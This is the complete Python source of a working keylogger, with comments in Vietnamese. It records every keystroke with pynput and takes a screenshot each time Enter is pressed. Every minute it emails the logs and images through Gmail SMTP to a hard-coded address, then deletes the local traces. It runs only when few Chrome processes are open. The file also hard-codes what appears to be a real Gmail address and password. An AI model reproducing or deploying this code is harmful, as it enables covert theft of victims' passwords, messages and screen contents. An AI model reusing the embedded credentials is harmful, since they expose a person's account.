import datetime
from os import listdir,remove,mkdir
from os.path import exists,basename
from smtplib import SMTP as smtplib_SMTP
from threading import Timer as threading_Timer
from autopy.bitmap import capture_screen
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
from pynput import keyboard
from psutil import process_iter

class KeyLogger:
    def __init__(self, time_interval, email, password):
        self.interval = time_interval
        self.log = "Bắt đầu collect..."
        self.email = email
        self.password = password

    def appendlog(self, string):
        self.log = self.log + string

    def appendtxt(self, string):
        f = open("./log/log.txt","a",encoding="utf-8")
        day = str(datetime.datetime.today().date())
        time = str(datetime.datetime.today().time())
        hour, minute = time.split(":")[0],time.split(":")[1]
        f.writelines("\n"+day+"("+hour+":"+minute+")\t"+string)
        f.close()

    def save_data(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.enter:
                current_key = "<ENTER>"
                self.screenImage()
            elif key == key.space:
                current_key = " "

            elif key == key.backspace:
                current_key = "<BACKSPACE>"
            elif key == key.esc:
                current_key = "<ESC>"
            else:
                current_key = " " + str(key) + " "
        self.appendlog(current_key)

    def send_mail(self, email, password, message):
        server = smtplib_SMTP('smtp.gmail.com', 587)
        server.ehlo()  # Can be omitted
        server.starttls()
        server.ehlo()  # Can be omitted

        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def report(self):
        f = open("./log/log.txt", "a+", encoding="utf-8")
        self.appendtxt(self.log)
        f.seek(0)
        content = f.read()
        f.close()
        if self.log != "":
            message = MIMEMultipart()
            message['Subject'] = 'Báo cáo mỗi phút'
            # lấy text
            text = MIMEText(content)
            message.attach(text)
            # lấy ảnh chụp màn hình
            try:
                for file in listdir('./images'):
                    with open('./images/'+file, 'rb') as f:
                        img_data = f.read()
                    image = MIMEImage(img_data, name=basename(file))
                    message.attach(image)
            except:
                pass

            # gửi email
            try:
                self.send_mail(self.email, self.password,message.as_string())

                # xoá file log.txt
                try:
                    f = open("./log/log.txt","w",encoding="utf-8")
                    f.close()
                except:
                    pass
                # xóa ảnh
                try:
                    for file in listdir('./images'):
                        remove('./images/' + file)
                except:
                    pass
            except:
                pass

            # reset về ban đầu
            # print(content)
            self.log = ""
            self.count = 1

        # chạy vòng tiếp theo
        timer = threading_Timer(self.interval, self.report)
        timer.start()

    def screenImage(self):
        day = str(datetime.datetime.today().date())
        times = str(datetime.datetime.today().time())
        time = times.split(".")[0].replace(':','-')
        bitmap = capture_screen()
        bitmap.save('./images/' + day+'('+time + ').png')

    def run(self):
        keyboard_listener = keyboard.Listener(on_press=self.save_data)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

count = 0
email_address = "dungmta99@gmail.com"
password = "Gg23111999"
interval = 60
keylogger = KeyLogger(interval, email_address, password)

for proc in process_iter():
    if proc.name() == "Chrome.exe":
        count += 1
if count < 3:
    if exists('images') == False:
        print("Create images")
    if exists('log') == False:
        mkdir('log')

    if exists('./log/log.txt') == False:
        f = open("./log/log.txt", "w", encoding="utf-8")
        f.close()
    keylogger.run()